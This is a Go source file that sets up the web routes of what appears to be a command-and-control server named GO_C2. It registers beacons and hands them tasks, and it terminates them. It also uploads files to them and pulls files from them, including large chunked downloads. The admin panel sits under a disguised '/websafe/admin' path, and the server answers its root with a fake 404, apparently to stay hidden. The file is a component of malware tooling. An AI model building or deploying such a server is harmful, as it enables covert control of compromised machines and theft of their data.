package main

import (
    "io/fs"
    "net/http"
    "github.com/gin-gonic/gin"
    cors "github.com/gin-contrib/cors"
    "GO_C2/config"
    "GO_C2/handler"
    "strings"
)

func setupRouter() *gin.Engine {
    r := gin.Default()

    r.MaxMultipartMemory = 10 << 20

	// 避免 /websafe/admin 与 /websafe/admin/ 的 301 循环与路径纠正
	r.RedirectTrailingSlash = false
	r.RedirectFixedPath = false

    r.Use(cors.New(cors.Config{
        AllowOrigins:     []string{"http://localhost:5173", "http://127.0.0.1:5173"},
        AllowMethods:     []string{"GET", "POST", "PUT", "DELETE", "OPTIONS"},
        AllowHeaders:     []string{"Origin", "Content-Type", "Authorization", "X-Request-ID"},
        ExposeHeaders:    []string{"Content-Length"},
        AllowCredentials: true,
    }))

    // // 静态文件占位（无）
    // var _ fs.FS
    // _ = http.FS
	// 静态资源与 SPA 回退（与 config.json 的 AdminPrefix 保持一致）
	staticSub, _ := fs.Sub(embeddedStaticFS, "public")
	adminPrefix := config.GlobalConfig.Routes.AdminPrefix // /websafe/admin
	apiPrefix := config.GlobalConfig.Routes.APIPrefix     // /websafe/api

	// 显式处理管理端根路径（带/与不带/），避免自动 301 重定向
	r.GET(adminPrefix, func(c *gin.Context) {
		b, err := fs.ReadFile(staticSub, "index.html")
		if err != nil { c.AbortWithStatus(http.StatusNotFound); return }
		c.Data(http.StatusOK, "text/html; charset=utf-8", b)
	})
	r.GET(adminPrefix+"/", func(c *gin.Context) {
		b, err := fs.ReadFile(staticSub, "index.html")
		if err != nil { c.AbortWithStatus(http.StatusNotFound); return }
		c.Data(http.StatusOK, "text/html; charset=utf-8", b)
	})


	// 静态资源与 SPA 回退通过 NoRoute 处理，避免与其它路由产生通配符冲突

	// 未匹配路由：对管理端前缀尝试静态文件并回退到 index.html，其它保持 404
	r.NoRoute(func(c *gin.Context) {
		p := c.Request.URL.Path
		// 管理端静态与 SPA 回退
		if p == adminPrefix || strings.HasPrefix(p, adminPrefix+"/") {
			rel := strings.TrimPrefix(strings.TrimPrefix(p, adminPrefix), "/")
			if rel == "" {
				c.FileFromFS("index.html", http.FS(staticSub))
				return
			}
			if f, err := staticSub.Open(rel); err == nil {
				_ = f.Close()
				c.FileFromFS(rel, http.FS(staticSub))
				return
			}
			c.FileFromFS("index.html", http.FS(staticSub))
			return
		}
		// 其它：保持原有 404 语义
		if strings.HasPrefix(p, apiPrefix) ||
			p == config.GlobalConfig.Routes.BeaconEndpoint ||
			p == config.GlobalConfig.Routes.RegisterPath {
			c.JSON(http.StatusNotFound, gin.H{"error": "Not Found"})
			return
		}
		c.JSON(http.StatusNotFound, gin.H{"error": "Not Found"})
	})


    r.GET("/", func(c *gin.Context) { c.JSON(http.StatusNotFound, gin.H{"error":"Not Found"}) })

    r.POST(config.GlobalConfig.Routes.RegisterPath, handler.RegisterHandler)
    r.Any(config.GlobalConfig.Routes.BeaconEndpoint, handler.BeaconHandler)

    api := r.Group(config.GlobalConfig.Routes.APIPrefix)
    {
        api.POST("/login", handler.AdminLoginHandler)
        authorized := api.Group("/", handler.AuthRequired())
        {
            authorized.GET("/beacons", handler.ListBeaconsHandler)
            authorized.GET("/beacons/:uuid", handler.GetBeaconHandler)
            authorized.POST("/beacons/:uuid/job", handler.UpdateBeaconJobHandler)
            authorized.POST("/beacons/:uuid/remark", handler.UpdateRemarkHandler)
            authorized.POST("/beacons/:uuid/terminate", handler.TerminateBeaconHandler)
            authorized.GET("/beacons/:uuid/history", handler.GetTaskHistoryHandler)
            authorized.POST("/beacons/:uuid/delete", handler.DeleteBeaconHandler)
            authorized.GET("/config", handler.GetConfigHandler)
            authorized.POST("/config", handler.UpdateConfigHandler)
            authorized.POST("/config/reload", handler.ReloadConfigHandler)
            // 用户管理
            authorized.GET("/users", handler.ListUsersHandler)
            authorized.POST("/users", handler.CreateUserHandler)
            authorized.POST("/users/password", handler.UpdateUserPasswordHandler)
            authorized.POST("/users/delete", handler.DeleteUserHandler)

            // 文件：下载存储、上传到 Beacon
            authorized.GET("/files/:uuid/:filename", handler.GetFileHandler)
            authorized.POST("/files/upload", handler.UploadToBeaconHandler)
            // 新增：从 storage 读取文件并发送给 beacon
            authorized.POST("/files/send-storage", handler.SendStorageFileToBeaconHandler)
            authorized.POST("/files/download", handler.DownloadFromBeaconHandler)
            // 新增：下载已保存的文件
            authorized.GET("/files/download/:uuid/:filename", handler.DownloadFileHandler)
            
            // 大文件下载支持
            authorized.POST("/files/download-large", handler.DownloadLargeFileFromBeaconHandler)
            authorized.GET("/files/download-progress", handler.GetDownloadProgressHandler)
            authorized.GET("/files/download-chunk", handler.DownloadFileChunkHandler)
            authorized.POST("/files/complete-download", handler.CompleteDownloadSessionHandler)
            
            // 任务队列相关API
            authorized.POST("/tasks/next", handler.GetNextTaskHandler)
            authorized.POST("/tasks/complete", handler.CompleteTaskHandler)
        }
    }

    return r
}

// setupBeaconOnlyRouter 仅提供可供 Beacon 通信的端点，用于额外监听口
func setupBeaconOnlyRouter() *gin.Engine {
    r := gin.Default()
    r.MaxMultipartMemory = 10 << 20
    r.POST(config.GlobalConfig.Routes.RegisterPath, handler.RegisterHandler)
    r.Any(config.GlobalConfig.Routes.BeaconEndpoint, handler.BeaconHandler)
    r.GET("/", func(c *gin.Context) { c.String(200, "OK") })
    return r
}


